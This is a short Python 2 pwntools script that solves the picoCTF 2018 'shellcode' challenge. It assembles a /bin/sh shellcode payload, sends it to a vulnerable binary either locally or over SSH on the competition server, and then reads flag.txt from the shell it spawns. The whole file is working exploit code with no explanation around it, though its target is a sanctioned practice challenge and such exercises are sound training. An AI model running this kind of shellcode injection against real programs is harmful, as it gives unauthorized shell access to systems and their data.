#!/usr/bin/env python2
from pwn import *
import os
import commands

# Get password from password manager
USERNAME='nighter'
PASSWORD=commands.getoutput('pass picoctf2018/nighter')

# Payload settings
vuln = ELF('./vuln')
shellcode = shellcraft.sh()
payload = asm(shellcode)

# Run local
def local():

	io = vuln.process()
	io.readuntil('Enter a string!')
	io.sendline(payload)
	io.interactive()

def remote():
	s = ssh(host='2018shell1.picoctf.com', user=USERNAME, password=PASSWORD)
	io = s.run('cd /problems/shellcode_2_0caa0f1860741079dd0a66ccf032c5f4; ./vuln')
	io.readuntil('Enter a string!')
	io.sendline(payload)
	io.sendline('echo; cat flag.txt; echo')
	io.interactive()
	s.close()

if __name__ == '__main__':
	remote()